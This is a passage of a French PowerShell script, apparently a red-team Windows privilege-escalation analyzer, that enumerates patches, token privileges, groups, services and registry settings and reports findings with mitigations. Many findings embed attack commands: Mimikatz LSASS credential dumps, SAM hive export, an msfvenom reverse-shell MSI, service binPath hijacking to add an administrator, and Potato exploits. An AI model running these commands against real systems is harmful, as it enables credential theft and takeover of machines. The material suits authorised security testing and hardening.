#Requires -Version 3.0
<#
.SYNOPSIS
    PrivEscHunter v1.1 - Windows Privilege Escalation Analyzer
    Auteur : SHERKO
    Cadre   : Red Team / Pentest avec autorisation explicite

.DESCRIPTION
    Analyse intelligente et corrélée des vecteurs d'élévation de privilège Windows.
    Affiche un rapport complet, coloré et détaillé directement dans la console.

.PARAMETER SkipNetworkEnum
    Sauter l'énumération réseau (plus rapide, moins de bruit)

.PARAMETER Verbose
    Afficher les détails d'énumération en console

.PARAMETER NoColor
    Désactiver les couleurs console (utile pour les pipes / redirection vers un fichier)

.EXAMPLE
    .\PrivEscHunter.ps1
    .\PrivEscHunter.ps1 -Verbose
    .\PrivEscHunter.ps1 -SkipNetworkEnum
    .\PrivEscHunter.ps1 -NoColor > rapport.txt
#>

[CmdletBinding()]
param(
    [switch]$SkipNetworkEnum,
    [switch]$NoColor
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"
$WarningPreference     = "SilentlyContinue"


try {
    if ($PSVersionTable.PSVersion.Major -le 5) {
        $null = cmd /c "chcp 65001" 2>$null
    }
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    $OutputEncoding = [System.Text.Encoding]::UTF8
} catch {}

# ──────────────────────────────────────────────────────────────
#  CONSTANTES & COULEURS
# ──────────────────────────────────────────────────────────────
$TOOL_VERSION = "1.1"
$TOOL_NAME    = "PrivEscHunter"
$TOOL_AUTHOR  = "SHERKO"

function Write-Banner {
    $banner = @"

  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║╚██╗ ██╔╝█████╗  ███████╗██║
  ██╔═══╝ ██╔══██╗██║ ╚████╔╝ ██╔══╝  ╚════██║██║
  ██║     ██║  ██║██║  ╚██╔╝  ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚══════╝ ╚═════╝
  ███████╗███████╗ ██████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
  ██╔════╝██╔════╝██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
  █████╗  ███████╗██║         ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
  ██╔══╝  ╚════██║██║         ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ███████╗███████║╚██████╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚══════╝╚══════╝ ╚═════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

  $TOOL_NAME v$TOOL_VERSION | $TOOL_AUTHOR
  [ Usage légal uniquement - Red Team & Pentest autorisés ]
"@
    if (-not $NoColor) {
        Write-Host $banner -ForegroundColor Cyan
    } else {
        Write-Host $banner
    }
}

function Write-Section {
    param([string]$Title)
    $line = "═" * 60
    if (-not $NoColor) {
        Write-Host "`n$line" -ForegroundColor DarkCyan
        Write-Host "  [*] $Title" -ForegroundColor Yellow
        Write-Host "$line" -ForegroundColor DarkCyan
    } else {
        Write-Host "`n$line`n  [*] $Title`n$line"
    }
}

function Write-Finding {
    param([string]$Level, [string]$Message)
    $prefix = switch ($Level) {
        "CRITICAL" { "[!!!]" }
        "HIGH"     { "[!!] " }
        "MEDIUM"   { "[!]  " }
        "LOW"      { "[i]  " }
        "INFO"     { "[>]  " }
        default    { "[?]  " }
    }
    $color = switch ($Level) {
        "CRITICAL" { "Red" }
        "HIGH"     { "DarkRed" }
        "MEDIUM"   { "Yellow" }
        "LOW"      { "Cyan" }
        "INFO"     { "Gray" }
        default    { "White" }
    }
    if (-not $NoColor) {
        Write-Host "  $prefix $Message" -ForegroundColor $color
    } else {
        Write-Host "  $prefix $Message"
    }
}

# Petit helper générique pour du texte coloré conditionnel (respecte -NoColor)
function Write-Line {
    param([string]$Text = "", [string]$Color = "White", [switch]$NoNewline)
    if (-not $NoColor) {
        if ($NoNewline) { Write-Host $Text -ForegroundColor $Color -NoNewline }
        else            { Write-Host $Text -ForegroundColor $Color }
    } else {
        if ($NoNewline) { Write-Host $Text -NoNewline }
        else            { Write-Host $Text }
    }
}

function Get-SeverityColor {
    param([string]$Severity)
    switch ($Severity) {
        "CRITICAL" { return "Red" }
        "HIGH"     { return "DarkRed" }
        "MEDIUM"   { return "Yellow" }
        "LOW"      { return "Cyan" }
        default    { return "White" }
    }
}

# ──────────────────────────────────────────────────────────────
#  STRUCTURE DE DONNÉES GLOBALE
# ──────────────────────────────────────────────────────────────
$Global:Report = @{
    Metadata    = @{}
    System      = @{}
    Identity    = @{}
    Tokens      = @{}
    Groups      = @()
    LocalUsers  = @()
    Services    = @()
    Network     = @{}
    Scheduled   = @()
    Registry    = @{}
    FileSystem  = @()
    Credentials = @()
    Findings    = @()
    Score       = 0
}

# ──────────────────────────────────────────────────────────────
#  FONCTION D'AJOUT DE FINDING
# ──────────────────────────────────────────────────────────────
function Add-Finding {
    param(
        [string]$Category,
        [string]$Severity,   # CRITICAL / HIGH / MEDIUM / LOW / INFO
        [string]$Title,
        [string]$Description,
        [string]$Evidence,
        [string]$Technique,  # MITRE ATT&CK
        [string[]]$Tools,
        [string]$Command,
        [string]$Mitigation
    )
    $score = switch ($Severity) {
        "CRITICAL" { 40 }
        "HIGH"     { 20 }
        "MEDIUM"   { 10 }
        "LOW"      { 5  }
        default    { 0  }
    }
    $Global:Report.Score += $score
    $Global:Report.Findings += @{
        Category    = $Category
        Severity    = $Severity
        Title       = $Title
        Description = $Description
        Evidence    = $Evidence
        Technique   = $Technique
        Tools       = $Tools
        Command     = $Command
        Mitigation  = $Mitigation
        Score       = $score
        Id          = [System.Guid]::NewGuid().ToString().Substring(0,8)
    }
    Write-Finding -Level $Severity -Message "[$Category] $Title"
}

# ══════════════════════════════════════════════════════════════
#  MODULE 1 : MÉTADONNÉES & SYSTÈME
# ══════════════════════════════════════════════════════════════
function Invoke-SystemEnum {
    Write-Section "INFORMATIONS SYSTÈME"

    $os    = Get-WmiObject Win32_OperatingSystem
    $comp  = Get-WmiObject Win32_ComputerSystem
    $bios  = Get-WmiObject Win32_BIOS
    $arch  = $env:PROCESSOR_ARCHITECTURE

    $Global:Report.System = @{
        Hostname        = $env:COMPUTERNAME
        OS              = $os.Caption
        Build           = $os.BuildNumber
        Version         = $os.Version
        SP              = $os.ServicePackMajorVersion
        Architecture    = $arch
        Domain          = $comp.Domain
        DomainRole      = $comp.DomainRole    # 0=Standalone,1=Member,2=Backup DC,3=Primary DC
        IsVM            = ($bios.Manufacturer -match "VMware|VirtualBox|Hyper-V|QEMU|Xen")
        Uptime          = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)
        Hotfixes        = @(Get-HotFix | Select-Object -ExpandProperty HotFixID)
        PSVersion       = $PSVersionTable.PSVersion.ToString()
        AMSI            = (Test-Path "HKLM:\SOFTWARE\Microsoft\AMSI")
        CLMState        = $ExecutionContext.SessionState.LanguageMode
    }

    Write-Host "  Hostname      : $($Global:Report.System.Hostname)" -ForegroundColor White
    Write-Host "  OS            : $($Global:Report.System.OS) (Build $($Global:Report.System.Build))" -ForegroundColor White
    Write-Host "  Architecture  : $($Global:Report.System.Architecture)" -ForegroundColor White
    Write-Host "  Domain        : $($Global:Report.System.Domain)" -ForegroundColor White
    Write-Host "  PowerShell    : $($Global:Report.System.PSVersion)" -ForegroundColor White
    Write-Host "  Language Mode : $($Global:Report.System.CLMState)" -ForegroundColor White
    Write-Host "  VM Détectée   : $($Global:Report.System.IsVM)" -ForegroundColor White

    #Détection constrained language mode
    if ($Global:Report.System.CLMState -ne "FullLanguage") {
        Add-Finding -Category "Defense" -Severity "MEDIUM" `
            -Title "PowerShell Constrained Language Mode actif" `
            -Description "CLM restreint l'exécution de code arbitraire en PowerShell. Certains modules et scripts avancés seront bloqués." `
            -Evidence "LanguageMode: $($Global:Report.System.CLMState)" `
            -Technique "T1059.001" `
            -Tools @("PSBypassCLM","PowerShdll","InstallUtil") `
            -Command 'powershell -version 2 -command "whoami"' `
            -Mitigation "Configurer WDAC/AppLocker correctement"
    }

    #OS obsolète
    $buildInt = [int]$Global:Report.System.Build
    if ($buildInt -lt 17763) {
        Add-Finding -Category "System" -Severity "HIGH" `
            -Title "OS Windows non supporté / non patché" `
            -Description "Build $($Global:Report.System.Build) indique un système potentiellement vulnérable à des CVE connues (PrintNightmare, HiveNightmare, etc.)" `
            -Evidence "Build: $($Global:Report.System.Build)" `
            -Technique "T1068" `
            -Tools @("PrintSpoofer","EfsPotato") `
            -Command 'systeminfo | findstr "KB"' `
            -Mitigation "Appliquer les mises à jour Windows immédiatement"
    }

    #Hotfixes manquants critiques
    $criticalKBs = @{
        "KB5005030" = "PrintNightmare (CVE-2021-34527)"
        "KB5003646" = "HiveNightmare (CVE-2021-36934)"
        "KB4535774" = "Zerologon (CVE-2020-1472)"
        "KB5015807" = "DFSCoerce / PetitPotam"
    }
    foreach ($kb in $criticalKBs.Keys) {
        if ($Global:Report.System.Hotfixes -notcontains $kb) {
            Add-Finding -Category "Patching" -Severity "HIGH" `
                -Title "Patch manquant : $($criticalKBs[$kb])" `
                -Description "Le correctif $kb n'est pas installé. Vecteur d'exploitation potentiel." `
                -Evidence "Hotfix $kb absent de la liste" `
                -Technique "T1068" `
                -Tools @("exploit-db","ExploitDB","Metasploit") `
                -Command "Get-HotFix -Id $kb" `
                -Mitigation "Installer $kb via Windows Update"
        }
    }
}

# ══════════════════════════════════════════════════════════════
#  MODULE 2 : IDENTITÉ & TOKENS
# ══════════════════════════════════════════════════════════════
function Invoke-IdentityEnum {
    Write-Section "IDENTITÉ & TOKENS"

    $whoami = whoami
    $sid    = (whoami /user 2>$null) -match "S-1-" | Out-String
    $domain = $env:USERDOMAIN
    $user   = $env:USERNAME

    # Tokens et privilèges
    $privOutput = whoami /priv 2>$null | Where-Object { $_ -match "Se" }
    $privs = @{}
    foreach ($line in $privOutput) {
        if ($line -match "^(Se\w+)\s+.+\s+(Enabled|Disabled)") {
            $privs[$Matches[1]] = $Matches[2]
        }
    }

    # Groupes actuels
    $groupOutput = whoami /groups 2>$null | Where-Object { $_ -match "S-1-" }
    $currentGroups = @()
    foreach ($line in $groupOutput) {
        if ($line -match "^([\w\\\s\-]+)\s+Group\s+") {
            $currentGroups += $Matches[1].Trim()
        }
    }

    $Global:Report.Identity = @{
        Username     = $user
        Domain       = $domain
        FullUser     = $whoami
        Privileges   = $privs
        CurrentGroups = $currentGroups
    }

    Write-Host "  Utilisateur   : $whoami" -ForegroundColor White
    Write-Host "  Privileges    : $($privs.Count) trouvés" -ForegroundColor White

    # Analyse des privilèges dangereux
    $dangerousPrivs = @{
        "SeImpersonatePrivilege"     = @{
            Sev = "CRITICAL"
            Desc = "Permet d'usurper l'identité d'un token NT AUTHORITY\SYSTEM via un named pipe ou COM."
            Tools = @("JuicyPotato","GodPotato","PrintSpoofer","RoguePotato","SweetPotato","EfsPotato","BadPotato")
            Cmd = ".\GodPotato.exe -cmd `"cmd /c whoami`""
            Mitre = "T1134.001"
        }
        "SeAssignPrimaryTokenPrivilege" = @{
            Sev = "CRITICAL"
            Desc = "Permet d'assigner un token primaire - combo avec SeImpersonate pour impersonation complète."
            Tools = @("JuicyPotato","GodPotato","PrintSpoofer")
            Cmd = ".\JuicyPotato.exe -l 1337 -p cmd.exe -t *"
            Mitre = "T1134.001"
        }
        "SeDebugPrivilege" = @{
            Sev = "CRITICAL"
            Desc = "Accès complet à tous les processus en mémoire. Dump de LSASS, injection dans des processus privilégiés."
            Tools = @("Mimikatz","ProcDump","SharpDump","nanodump")
            Cmd = ".\mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" exit"
            Mitre = "T1003.001"
        }
        "SeBackupPrivilege" = @{
            Sev = "HIGH"
            Desc = "Lecture de tous les fichiers du système indépendamment des ACL. Vol du SAM/SYSTEM/NTDS.dit."
            Tools = @("BackupOperatorToDA","SeBackupPrivilegeUtils","Robocopy")
            Cmd = 'reg save HKLM\SAM C:\Temp\sam.hiv && reg save HKLM\SYSTEM C:\Temp\sys.hiv'
            Mitre = "T1003.002"
        }
        "SeRestorePrivilege" = @{
            Sev = "HIGH"
            Desc = "Écriture dans tous les fichiers. Modification de binaires système, de la base de registre HKLM."
            Tools = @("SeRestoreAbuse","RstPriv")
            Cmd = 'reg restore HKLM\SAM malicious.hiv'
            Mitre = "T1068"
        }
        "SeTakeOwnershipPrivilege" = @{
            Sev = "HIGH"
            Desc = "Prise de propriété de n'importe quel objet Windows. Modification de services ou binaires privilégiés."
            Tools = @("takeown.exe","icacls.exe")
            Cmd = 'takeown /F C:\Windows\System32\utilman.exe && icacls C:\Windows\System32\utilman.exe /grant $env:USERNAME:F'
            Mitre = "T1222.001"
        }
        "SeLoadDriverPrivilege" = @{
            Sev = "HIGH"
            Desc = "Chargement de drivers arbitraires en mode kernel. Bypass de protections kernel."
            Tools = @("EopLoadDriver","Capcom.sys exploit")
            Cmd = '.\EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\malicious.sys'
            Mitre = "T1068"
        }
        "SeCreateTokenPrivilege" = @{
            Sev = "CRITICAL"
            Desc = "Création de tokens d'accès arbitraires incluant des groupes ou privilèges supplémentaires."
            Tools = @("CreateToken","TokenAbuse")
            Cmd = "Custom code pour NtCreateToken avec SID SYSTEM"
            Mitre = "T1134.002"
        }
        "SeManageVolumePrivilege" = @{
            Sev = "MEDIUM"
            Desc = "Accès direct aux volumes - peut permettre la lecture/écriture directe sur disque."
            Tools = @("SeManageVolumeExploit")
            Cmd = 'Lecture directe de secteurs disque'
            Mitre = "T1068"
        }
        "SeTcbPrivilege" = @{
            Sev = "CRITICAL"
            Desc = "Act as part of OS. Privilège le plus dangereux - permet de créer des tokens avec n'importe quel SID."
            Tools = @("Custom code")
            Cmd = "Création de token avec LsaLogonUser"
            Mitre = "T1134"
        }
    }

    foreach ($priv in $privs.Keys) {
        if ($dangerousPrivs.ContainsKey($priv) -and $privs[$priv] -eq "Enabled") {
            $p = $dangerousPrivs[$priv]
            Add-Finding -Category "Tokens" -Severity $p.Sev `
                -Title "Privilège dangereux actif : $priv" `
                -Description $p.Desc `
                -Evidence "$priv = $($privs[$priv])" `
                -Technique $p.Mitre `
                -Tools $p.Tools `
                -Command $p.Cmd `
                -Mitigation "Révoquer ce privilège du compte ou du groupe concerné"
        }
    }

    #Groupes sensibles
    $sensitiveGroups = @{
        "Administrators"          = @{ Sev="CRITICAL"; Desc="Membre du groupe Administrateurs local - déjà admin !" }
        "BUILTIN\Administrators"  = @{ Sev="CRITICAL"; Desc="Membre du groupe Administrateurs local - déjà admin !" }
        "Domain Admins"           = @{ Sev="CRITICAL"; Desc="Membre des Domain Admins - contrôle du domaine" }
        "Enterprise Admins"       = @{ Sev="CRITICAL"; Desc="Enterprise Admins - contrôle de la forêt AD" }
        "Schema Admins"           = @{ Sev="CRITICAL"; Desc="Schema Admins - modification du schéma AD" }
        "Backup Operators"        = @{ Sev="HIGH";     Desc="Backup Operators - accès en lecture à tous les fichiers" }
        "Remote Desktop Users"    = @{ Sev="MEDIUM";   Desc="Accès RDP au système" }
        "Remote Management Users" = @{ Sev="MEDIUM";   Desc="WinRM/PSRemoting accessible" }
        "DnsAdmins"               = @{ Sev="HIGH";     Desc="DnsAdmins - peut charger une DLL via le service DNS (privesc → DA)" }
        "Account Operators"       = @{ Sev="HIGH";     Desc="Gestion de comptes AD - abus possible sur GPO/ACL" }
        "Server Operators"        = @{ Sev="HIGH";     Desc="Server Operators - démarrage/arrêt de services, logon local sur DCs" }
        "Print Operators"         = @{ Sev="HIGH";     Desc="Print Operators - SeLoadDriverPrivilege, logon DC" }
        "Event Log Readers"       = @{ Sev="LOW";      Desc="Lecture des journaux d'événements" }
        "Performance Monitor Users"=@{ Sev="LOW";      Desc="Monitoring des processus" }
        "Network Configuration Operators"=@{ Sev="MEDIUM"; Desc="Modification de la configuration réseau" }
    }

    $allGroups = net localgroup 2>$null
    $userGroups = $currentGroups

    foreach ($grp in $sensitiveGroups.Keys) {
        $matched = $userGroups | Where-Object { $_ -match [regex]::Escape($grp.Split("\")[-1]) }
        if ($matched) {
            $g = $sensitiveGroups[$grp]
            Add-Finding -Category "Groups" -Severity $g.Sev `
                -Title "Membre du groupe sensible : $grp" `
                -Description $g.Desc `
                -Evidence "Groupe trouvé dans whoami /groups" `
                -Technique "T1069.001" `
                -Tools @("net localgroup","Get-LocalGroupMember") `
                -Command "net localgroup `"$grp`"" `
                -Mitigation "Supprimer du groupe si non nécessaire (moindre privilège)"
        }
    }
}

# ══════════════════════════════════════════════════════════════
#  MODULE 3 : UTILISATEURS LOCAUX
# ══════════════════════════════════════════════════════════════
function Invoke-LocalUsersEnum {
    Write-Section "UTILISATEURS LOCAUX"

    try {
        $users = Get-LocalUser
        $Global:Report.LocalUsers = @()
        foreach ($u in $users) {
            $uInfo = @{
                Name         = $u.Name
                Enabled      = $u.Enabled
                LastLogon    = $u.LastLogon
                PasswordRequired = $u.PasswordRequired
                PasswordExpires  = $u.PasswordExpires
                Description  = $u.Description
            }
            $Global:Report.LocalUsers += $uInfo
            Write-Host "  [$( if($u.Enabled){'ON'}else{'OFF'})] $($u.Name) - PwdReq: $($u.PasswordRequired)" -ForegroundColor $(if($u.Enabled){'White'}else{'DarkGray'})

            # Compte sans mot de passe requis et actif
            if ($u.Enabled -and -not $u.PasswordRequired) {
                Add-Finding -Category "LocalUsers" -Severity "HIGH" `
                    -Title "Compte actif sans mot de passe : $($u.Name)" `
                    -Description "Le compte $($u.Name) est actif mais ne requiert pas de mot de passe. Accès direct possible." `
                    -Evidence "User: $($u.Name), Enabled: $($u.Enabled), PasswordRequired: $($u.PasswordRequired)" `
                    -Technique "T1078.003" `
                    -Tools @("net use","runas","crackmapexec") `
                    -Command "net use \\$($env:COMPUTERNAME)\C$ /user:$($u.Name) `"`"" `
                    -Mitigation "Activer l'obligation de mot de passe"
            }
        }
    } catch {
        $usersRaw = net user 2>$null
        Write-Host "  Fallback net user utilisé" -ForegroundColor DarkYellow
    }

    # Guest account
    $guest = Get-LocalUser -Name "Guest" 2>$null
    if ($guest -and $guest.Enabled) {
        Add-Finding -Category "LocalUsers" -Severity "MEDIUM" `
            -Title "Compte Guest activé" `
            -Description "Le compte Invité Windows est actif, ce qui peut permettre un accès non authentifié à certaines ressources." `
            -Evidence "Guest: Enabled" `
            -Technique "T1078.003" `
            -Tools @("net use","smbclient") `
            -Command 'net use \\$env:COMPUTERNAME\C$ /user:Guest ""' `
            -Mitigation "Désactiver le compte Guest"
    }
}

# ══════════════════════════════════════════════════════════════
#  MODULE 4 : SERVICES VULNÉRABLES
# ══════════════════════════════════════════════════════════════
function Invoke-ServicesEnum {
    Write-Section "ANALYSE DES SERVICES"

    $services = Get-WmiObject Win32_Service | Where-Object { $_.State -eq "Running" }
    $Global:Report.Services = @()

    foreach ($svc in $services) {
        $svcInfo = @{
            Name       = $svc.Name
            DisplayName= $svc.DisplayName
            Path       = $svc.PathName
            StartName  = $svc.StartName
            State      = $svc.State
            StartMode  = $svc.StartMode
        }
        $Global:Report.Services += $svcInfo

        #Service tournant comme SYSTEM avec chemin modifiable
        if ($svc.StartName -match "LocalSystem|SYSTEM" -and $svc.PathName) {
            $exePath = $svc.PathName -replace '"', '' -replace ' .*$', ''
            $exePath = $exePath.Trim()

            # Vérif si chemin unquoted avec espace
            if ($svc.PathName -match "^[^`"].*\s.*\.(exe|dll)" -and $svc.PathName -notmatch "^`"") {
                Add-Finding -Category "Services" -Severity "HIGH" `
                    -Title "Unquoted Service Path : $($svc.Name)" `
                    -Description "Le chemin du service '$($svc.Name)' contient des espaces sans guillemets. Windows peut charger un binaire malveillant à la place." `
                    -Evidence "Path: $($svc.PathName)" `
                    -Technique "T1574.009" `
                    -Tools @("PowerUp","SharpUp","winPEAS","sc.exe") `
                    -Command "sc qc `"$($svc.Name)`"" `
                    -Mitigation "Encapsuler le chemin entre guillemets dans la clé ImagePath"
            }

            # Vérif permissions sur le binaire
            if ($exePath -and (Test-Path $exePath)) {
                $acl = Get-Acl $exePath 2>$null
                if ($acl) {
                    foreach ($access in $acl.Access) {
                        $rights = $access.FileSystemRights.ToString()
                        if ($access.IdentityReference -match "Everyone|BUILTIN\\Users|Authenticated Users" `
                            -and $rights -match "FullControl|Modify|Write") {
                            Add-Finding -Category "Services" -Severity "CRITICAL" `
                                -Title "Binaire de service modifiable : $($svc.Name)" `
                                -Description "Le binaire du service SYSTEM '$($svc.Name)' est modifiable par des utilisateurs non privilégiés. Remplacement → SYSTEM." `
                                -Evidence "Path: $exePath`nIdentity: $($access.IdentityReference)`nRights: $rights" `
                                -Technique "T1574.010" `
                                -Tools @("PowerUp","msfvenom","SharpUp") `
                                -Command "copy malicious.exe `"$exePath`" && sc stop $($svc.Name) && sc start $($svc.Name)" `
                                -Mitigation "Corriger les ACL sur le binaire"
                        }
                    }
                }
            }
        }

        #Service modifiable par l'utilisateur courant (SCManager)
        $svcAcl = sc.exe sdshow $svc.Name 2>$null
        if ($svcAcl -match "D:.*(A;.*;RPWP|A;.*;DC|A;.*;GA)") {
            Add-Finding -Category "Services" -Severity "HIGH" `
                -Title "Service reconfigurable : $($svc.Name)" `
                -Description "L'utilisateur courant peut modifier la configuration du service. Changement de binPath → exécution SYSTEM." `
                -Evidence "SDDL: $($svcAcl -join '')" `
                -Technique "T1574.011" `
                -Tools @("PowerUp","sc.exe","SharpUp") `
                -Command "sc config `"$($svc.Name)`" binpath= `"cmd /c net localgroup Administrators $env:USERNAME /add`"" `
                -Mitigation "Restreindre les droits SCManager sur ce service"
        }
    }

    #Services spécifiques connus
    $knownVulnServices = @{
        "spooler" = @{
            Sev  = "HIGH"
            Desc = "Print Spooler actif - vulnérable à PrintNightmare (CVE-2021-34527) et SpoolFool"
            Tools = @("PrintNightmare.exe","SharpPrintNightmare","Impacket CVE-2021-1675")
            Cmd  = '.\SharpPrintNightmare.exe \\target\share\malicious.dll \\DC01'
            Mitre = "CVE-2021-34527"
        }
        "wuauserv" = @{
            Sev  = "LOW"
            Desc = "Windows Update actif - vérifier les droits du cache %SystemRoot%\SoftwareDistribution"
            Tools = @("PowerUp")
            Cmd  = 'icacls C:\Windows\SoftwareDistribution'
            Mitre = "T1195"
        }
        "IISADMIN" = @{
            Sev  = "MEDIUM"
            Desc = "IIS admin actif - vérifier les répertoires web et les config de pool d'applis"
            Tools = @("appcmd.exe","IISReset")
            Cmd  = 'C:\Windows\System32\inetsrv\appcmd.exe list apppool /processModel.userName:?'
            Mitre = "T1505.004"
        }
        "MSSQLSERVER" = @{
            Sev  = "HIGH"
            Desc = "SQL Server actif - vérifier xp_cmdshell, impersonation, trusted DB"
            Tools = @("PowerUpSQL","SQLCMD","HeidiSQL")
            Cmd  = "Invoke-SQLAudit -Verbose | Out-GridView"
            Mitre = "T1505.001"
        }
        "jenkins" = @{
            Sev  = "HIGH"
            Desc = "Jenkins actif - Script Console permet RCE si accès admin"
            Tools = @("Jenkins-CLI","Groovy RCE")
            Cmd  = 'curl -u admin:password http://localhost:8080/script -d "script=print+cmd"'
            Mitre = "T1059.002"
        }
    }

    foreach ($svcName in $knownVulnServices.Keys) {
        $found = $services | Where-Object { $_.Name -eq $svcName -or $_.DisplayName -match $svcName }
        if ($found) {
            $vs = $knownVulnServices[$svcName]
            Add-Finding -Category "Services" -Severity $vs.Sev `
                -Title "Service à risque détecté : $svcName" `
                -Description $vs.Desc `
                -Evidence "Service $svcName en cours d'exécution" `
                -Technique $vs.Mitre `
                -Tools $vs.Tools `
                -Command $vs.Cmd `
                -Mitigation "Désactiver ou sécuriser $svcName"
        }
    }

    Write-Host "  $($Global:Report.Services.Count) services analysés" -ForegroundColor Gray
}

# ══════════════════════════════════════════════════════════════
#  MODULE 5 : REGISTRE
# ══════════════════════════════════════════════════════════════
function Invoke-RegistryEnum {
    Write-Section "REGISTRE SENSIBLE"

    $findings = @{}

    #AlwaysInstallElevated
    $aie64 = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
        -Name AlwaysInstallElevated -EA 0).AlwaysInstallElevated
    $aie32 = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
        -Name AlwaysInstallElevated -EA 0).AlwaysInstallElevated

    if ($aie64 -eq 1 -and $aie32 -eq 1) {
        Add-Finding -Category "Registry" -Severity "CRITICAL" `
            -Title "AlwaysInstallElevated activé (HKLM + HKCU)" `
            -Description "Tout fichier .MSI s'installe avec les droits SYSTEM. Génération d'un MSI malveillant → SYSTEM immédiat." `
            -Evidence "HKLM: $aie64 / HKCU: $aie32" `
            -Technique "T1218.007" `
            -Tools @("msfvenom","PowerUp","Metasploit") `
            -Command 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o pwn.msi && msiexec /quiet /qn /i pwn.msi' `
            -Mitigation "Désactiver AlwaysInstallElevated dans la GPO"
    }

    #Autologon credentials
    $autoLogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -EA 0
    if ($autoLogon.DefaultUserName -and $autoLogon.DefaultPassword) {
        Add-Finding -Category "Credentials" -Severity "CRITICAL" `
            -Title "Credentials Autologon en clair dans le registre" `
            -Description "Des credentials sont stockés en clair pour l'autologon Windows." `
            -Evidence "User: $($autoLogon.DefaultUserName) | Pass: [REDACTED - présent]" `
            -Technique "T1552.002" `
            -Tools @("Mimikatz","reg query","LaZagne") `
            -Command 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword' `
            -Mitigation "Supprimer les credentials d'autologon ou utiliser AutoLogon de Sysinternals chiffré"
    }

    #LSA Cached credentials
    $cachedLogons = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" `
        -Name CachedLogonsCount -EA 0).CachedLogonsCount
    if ([int]$cachedLogons -gt 0) {
        Add-Finding -Category "Credentials" -Severity "MEDIUM" `
            -Title "DCC2 Cached Credentials : $cachedLogons logons en cache" `
            -Description "Des hash DCC2 de domaine sont mis en cache localement. Crackables hors ligne mais lents." `
            -Evidence "CachedLogonsCount: $cachedLogons" `
            -Technique "T1003.005" `
            -Tools @("Mimikatz","impacket-secretsdump","hashcat -m 2100") `
            -Command 'mimikatz # lsadump::cache' `
            -Mitigation "Réduire CachedLogonsCount à 0 ou 1"
    }

    #LSA Protection
    $lsaProtect = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
        -Name RunAsPPL -EA 0).RunAsPPL
    if (-not $lsaProtect -or $lsaProtect -eq 0) {
        Add-Finding -Category "Defense" -Severity "HIGH" `
            -Title "LSA Protection (PPL) désactivée" `
            -Description "LSASS n'est pas protégé par PPL. Un processus avec SeDebugPrivilege peut dumpser la mémoire directement." `
            -Evidence "RunAsPPL: $lsaProtect" `
            -Technique "T1003.001" `
            -Tools @("Mimikatz","Nanodump","ProcDump","SharpDump") `
            -Command '.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit' `
            -Mitigation "Activer RunAsPPL = 1 dans HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
    }

    #Credential Manager / DPAPI
    $credFiles = Get-ChildItem "$env:USERPROFILE\AppData\Local\Microsoft\Credentials\" -EA 0
    $credFilesRoaming = Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Microsoft\Credentials\" -EA 0
    $allCreds = @($credFiles) + @($credFilesRoaming) | Where-Object { $_ }
    if ($allCreds.Count -gt 0) {
        Add-Finding -Category "Credentials" -Severity "HIGH" `
            -Title "$($allCreds.Count) blob(s) DPAPI / Credential Manager détectés" `
            -Description "Des credentials chiffrés DPAPI sont présents. Si on a accès au contexte utilisateur, on peut les déchiffrer avec Mimikatz." `
            -Evidence "Fichiers: $($allCreds.Name -join ', ')" `
            -Technique "T1555.004" `
            -Tools @("Mimikatz","SharpDPAPI","DonPAPI") `
            -Command 'mimikatz # dpapi::cred /in:C:\Users\...\Credentials\BLOBFILE /unprotect' `
            -Mitigation "Audit des credentials stockés + rotation des mots de passe"
    }

    #Wdigest
    $wdigest = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
        -Name UseLogonCredential -EA 0).UseLogonCredential
    if ($wdigest -eq 1) {
        Add-Finding -Category "Credentials" -Severity "CRITICAL" `
            -Title "WDigest activé : mots de passe en clair en mémoire" `
            -Description "UseLogonCredential=1 force Windows à stocker les mots de passe en clair dans LSASS. Dump direct." `
            -Evidence "UseLogonCredential: 1" `
            -Technique "T1003.001" `
            -Tools @("Mimikatz","nanodump") `
            -Command 'mimikatz # sekurlsa::wdigest' `
            -Mitigation "Désactiver WDigest : Set UseLogonCredential=0"
    }

    #Defender exclusions
    $defExcl = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -EA 0
    if ($defExcl) {
        $paths = $defExcl.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" }
        if ($paths) {
            $pathList = ($paths | ForEach-Object { $_.Name }) -join ", "
            Add-Finding -Category "Defense" -Severity "HIGH" `
                -Title "Exclusions Windows Defender : $($paths.Count) chemin(s)" `
                -Description "Des chemins sont exclus de l'analyse Defender. Dépôt idéal pour les outils offensifs." `
                -Evidence "Chemins exclus: $pathList" `
                -Technique "T1562.001" `
                -Tools @("Tout outil offensif") `
